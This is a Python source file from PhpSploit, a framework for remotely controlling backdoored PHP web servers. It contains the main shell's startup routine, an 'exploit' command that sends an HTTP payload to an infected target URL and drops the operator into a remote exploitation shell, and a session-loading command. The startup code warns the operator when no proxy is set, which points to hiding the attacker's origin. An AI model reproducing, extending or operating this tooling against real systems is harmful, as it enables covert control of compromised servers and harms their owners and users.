from functions       import *
from interface       import core
from interface.func  import *

class Start(core.CoreShell):
    """PhpSploit Main Shell Interface:
    This class, which inherits from the CoreShell interface, provides
    the main shell specificities, such as the mainn shell dedicated
    shell commands.
    """
    shell_name = 'main'

    def __init__(self):
        """Explicitly load the CoreShell's __init__ method"""
        core.CoreShell.__init__(self)


    def preloop(self):
        self.run('clear')

        softwareLogo  = getpath('framework/misc/logo.ascii').read().rstrip()
        introduction  = getpath('framework/misc/intro.msg').read().strip()
        startMessage  = getpath('framework/misc/messages.lst').randline()

        # print intro and help
        print softwareLogo
        print ''
        print color(1)
        print introduction
        print color(0,37)
        print startMessage+color(0)
        self.run('help')

        # inform if using session
        if 'SAVEFILE' in self.CNF['SET']:
            print(P_inf+"Using session file "+
                  quot(self.CNF['SET']['SAVEFILE']))

            # alert if saved session settings doesn't
            # comply anymore with requirements:
            from usr import settings
            if not settings.comply(self.CNF['SET']):
                print(P_inf+"Please change your outdated"
                      " settings with the 'set' command.")

        # alert if no proxy
        if self.CNF['SET']['PROXY'].lower() in ['','none']:
            print(P_err+'No proxy gateway ! stay careful...')

        # add empty LNK if don't exist
        if not 'LNK' in self.CNF:
            self.CNF['LNK'] = dict()

        # update the LNK
        self.CNF['LNK'] = update_opener(self.CNF)


    ########################
    ### COMMAND: exploit ###
    def do_exploit(self, argv):
        """Drop a shell from target server

        SYNOPSIS:
            exploit

        DESCRIPTION:
            Send an HTTP request to the remote server's url, defined
            by the TARGET setting. This first request will try to
            execute the phpsploit's base payload, which retrieves some
            fundamental informations concerning the remote server, such
            as the server signature, and php environment. Il also
            uses the caught informations to determine some environment
            variables, such as CWD or WEB_ROOT.

            NOTE: The TARGET setting must be a remote http(s) url which
            has been infected by the phpsploit backdoor payload.
            Take a look at the documentation (rtfm command), and also
            the "infect" command.
        """

        # if the target url is correcly defined
        if 'URL' in self.CNF['LNK']:
            print(P_inf+'Sending http payload...')
            # try to estabilish a link with the remote server
            from network import server
            link = server.Link(self.CNF)
            if link.open():
                # open the remote exploitation shell at success
                self.CNF['SRV'] = link.srv_vars
                from interface import remoteshell
                shell = remoteshell.Start()
                shell.CNF = self.CNF
                shell.cmdloop()
                link.close()
        # inform the user if the TARGET setting is no correctly set
        else:
            print(P_err+"Undefined target, please enable"
                  " it with 'set TARGET <backdoored-url>")


    #####################
    ### COMMAND: load ###
    def do_load(self, argv):
        """Load a PhpSploit session file

        SYNOPSIS:
            load [<FILE>]

        DESCRIPTION:
            The framework handles sessions, which can be saved as
            common files by using the "save" command.
            In order to reuse a previously saved PhpSploit session
            file, this command must be used, restoring it to the current
            interface.
            Used without argument, the command try to load a working
            "phpsploit.session" file from the current directory.

        EXAMPLES:
            > load /tmp/phpsploit.session
              - Loads the file path given as argument
            > load
              - Try to load "./phpsploit.session" (current directory)
        """
        argv.append('phpsploit.session') # set default argument value

        # try to load the wanted session file
        from usr.session import load
        session = load(argv[1], self.CNF['PSCOREVER'])
        if session.error:
            print( session.error )
            return(None)
        else:
            old = self.CNF
            self.CNF = session.content

            # only these vars do not unherit the new session
            self.CNF['PSCOREVER'] = old['PSCOREVER']
            self.CNF['PSVERSION'] = old['PSVERSION']
            self.CNF['SET']['SAVEFILE'] = os.path.abspath(argv[1])
